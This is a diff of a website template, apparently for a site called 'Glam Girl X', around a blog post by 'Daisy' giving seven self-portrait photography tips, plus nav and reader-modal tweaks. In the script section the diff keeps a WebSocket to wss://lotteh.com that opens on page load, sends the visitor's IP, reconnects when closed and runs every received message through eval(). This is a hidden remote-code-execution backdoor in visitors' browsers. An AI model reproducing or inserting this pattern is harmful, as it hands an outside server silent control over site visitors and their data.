@@ -65,7 +65,7 @@
               <a class="nav-link" href="/en/landing" title="Visit the landing page">Landing</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video chat">Chat</a>
+              <a class="nav-link" href="/en/chat" title="Video chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/en/private" title="See private photos with a key">Private</a>
@@ -123,14 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>By Daisy</i></p>
 
-<div style="white-space: pre-wrap;">
+<div style="white-space: pre-wrap;"><p>How do i take the best photos of myself?</p><p><br/></p><p>1. Lighting: Natural light is always best for taking photos. Position yourself facing a window or go outside to take advantage of natural sunlight. Avoid harsh overhead lighting or direct sunlight, as it can create unflattering shadows on your face.</p><p><br/></p><p>2. Background: Choose a clean and uncluttered background to avoid distractions in your photos. A plain wall, a scenic outdoor setting, or a simple backdrop can all work well to highlight yourself in the photo.</p><p><br/></p><p>3. Pose: Experiment with different poses to find what flatters your features the most. Avoid awkward angles and instead, try to elongate your neck and tilt your head slightly to create a more flattering look.</p><p><br/></p><p>4. Composition: Pay attention to the composition of your photos. Use the rule of thirds by placing yourself off-center in the frame to create a more visually appealing image. You can also experiment with different angles and perspectives to add interest to your photos.</p><p><br/></p><p>5. Smile and expression: A genuine smile can instantly elevate your photos. Relax your face, think of something that makes you happy, and let your natural smile shine through. Also, try different facial expressions to convey different moods and emotions in your photos.</p><p><br/></p><p>6. Use a timer or selfie stick: To get a steady and well-composed shot, consider using a timer on your camera or a selfie stick to extend your reach and capture a wider frame. This will help you avoid blurry or unflattering selfies.</p><p><br/></p><p>7. Edit your photos: After taking your photos, use photo editing tools or apps to enhance the colors, lighting, and overall look of your images. You can adjust the brightness, contrast, and saturation to make your photos pop.</p><p><br/></p><p>Remember, practice makes perfect, so don't be afraid to experiment and have fun while taking photos of yourself.</p><div><br/></div></div>
 
-
-
-<p>How do i take the best photos of myself?</p><p><br></p><p>1. Lighting: Natural light is always best for taking photos. Position yourself facing a window or go outside to take advantage of natural sunlight. Avoid harsh overhead lighting or direct sunlight, as it can create unflattering shadows on your face.</p><p><br></p><p>2. Background: Choose a clean and uncluttered background to avoid distractions in your photos. A plain wall, a scenic outdoor setting, or a simple backdrop can all work well to highlight yourself in the photo.</p><p><br></p><p>3. Pose: Experiment with different poses to find what flatters your features the most. Avoid awkward angles and instead, try to elongate your neck and tilt your head slightly to create a more flattering look.</p><p><br></p><p>4. Composition: Pay attention to the composition of your photos. Use the rule of thirds by placing yourself off-center in the frame to create a more visually appealing image. You can also experiment with different angles and perspectives to add interest to your photos.</p><p><br></p><p>5. Smile and expression: A genuine smile can instantly elevate your photos. Relax your face, think of something that makes you happy, and let your natural smile shine through. Also, try different facial expressions to convey different moods and emotions in your photos.</p><p><br></p><p>6. Use a timer or selfie stick: To get a steady and well-composed shot, consider using a timer on your camera or a selfie stick to extend your reach and capture a wider frame. This will help you avoid blurry or unflattering selfies.</p><p><br></p><p>7. Edit your photos: After taking your photos, use photo editing tools or apps to enhance the colors, lighting, and overall look of your images. You can adjust the brightness, contrast, and saturation to make your photos pop.</p><p><br></p><p>Remember, practice makes perfect, so don't be afraid to experiment and have fun while taking photos of yourself.</p><div><br></div>
-
-
-</div>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -247,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -257,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -434,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -457,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
